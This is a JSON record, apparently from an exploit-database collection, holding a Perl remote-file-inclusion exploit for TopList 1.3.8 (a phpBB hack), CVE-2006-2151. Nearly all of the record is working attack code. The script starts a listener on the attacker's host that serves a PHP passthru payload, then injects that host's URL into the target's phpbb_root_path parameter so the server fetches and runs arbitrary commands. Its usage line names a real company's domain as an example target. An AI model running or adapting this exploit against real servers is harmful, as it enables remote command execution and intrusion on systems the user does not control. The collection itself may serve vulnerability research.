{
  "id": "1724",
  "title": "TopList 1.3.8 - &#039;phpBB Hack&#039; Remote File Inclusion (2)",
  "cve": "CVE-2006-2151",
  "vuln_type": "file_upload",
  "code": "# TopList Hack for PHPBB <= 1.3.8 Remote File Inclusion\r\n# Based on http://milw0rm.com/exploits/1722\r\n# Bug found by : [Oo]\r\n#\r\n# No more uploading php shells !!! \r\n# This is my way of php include exploitation !!!\r\n# Learn to play with sockets !!!\r\n# FOX_MULDER (fox_mulder@abv.bg)\r\n\r\n#!/usr/bin/perl\r\n  use LWP 5.64;\r\n  use IO::Socket;\r\n  use LWP::Simple;\r\n\r\n(my $hostname, my $target, my $dir,my $command) = @ARGV;\r\n\r\nif(@ARGV < 4) {\r\nprint \"=======================================================================+\\n\";\r\nprint \"TopList REMOTE COMMAND EXECUTION EXPLOIT by fox_mulder\\@abv.bg         |\\n\";\r\nprint \"Usage: top.pl yourIP target /dir/ \\\"command\\\"                            |\\n\";\r\nprint \"Example: top.pl 10.20.30.40 www.microsoft.com /forum/ \\\"uname -a\\\"     |\\n\";\r\nprint \"=======================================================================+\\n\";\r\nexit;\r\n}\r\nprint \"[+]Creating listening socket . . .\\n\";\r\nmy $sock = new IO::Socket::INET (\r\n                                  LocalHost => \"$hostname\",\r\n                                  LocalPort => '9999',\r\n                                  Proto => 'tcp',\r\n                                  Listen => 1,\r\n                                  Reuse => 1,\r\n                                 );\r\n die \"Could not create socket: $!\\n\" unless $sock;\r\n\r\n        if (my $pid = fork){\r\n        my $new_sock = $sock->accept();\r\n                my $request = <$new_sock>;\r\n                print $new_sock \"HTTP/1.1 200 OK\\n\";\r\n                print $new_sock \"Content-Length: $content_length\\n\";\r\n                print $new_sock \"Content-Type: text/plain\\n\\n\";\r\n                print $new_sock \"<? error_reporting(0);passthru(\\\"$command\\\"); ?>\\n\";\r\n                close $new_sock;\r\n                exit;\r\n        }\r\nprint \"[+]Injecting  command . . .\\n\";\r\n\r\nmy $browser = LWP::UserAgent->new;\r\n   $browser->agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');\r\n\r\n  my $url = \"http://$target/$dir/toplist.php\";\r\n  my $response = $browser->post( $url,\r\n    [\r\n\t'f'            => \"toplist_top10\",\r\n        'phpbb_root_path' => \"http://$hostname:9999/blah.php\"\r\n]\r\n  );\r\n\r\n  die \"Received invalid response type\", $response->content_type\r\n   unless $response->content_type eq 'text/html';\r\n\r\n        print $response->content;\r\n\r\n# milw0rm.com [2006-04-28]",
  "url": "https://www.exploit-db.com/exploits/1724"
}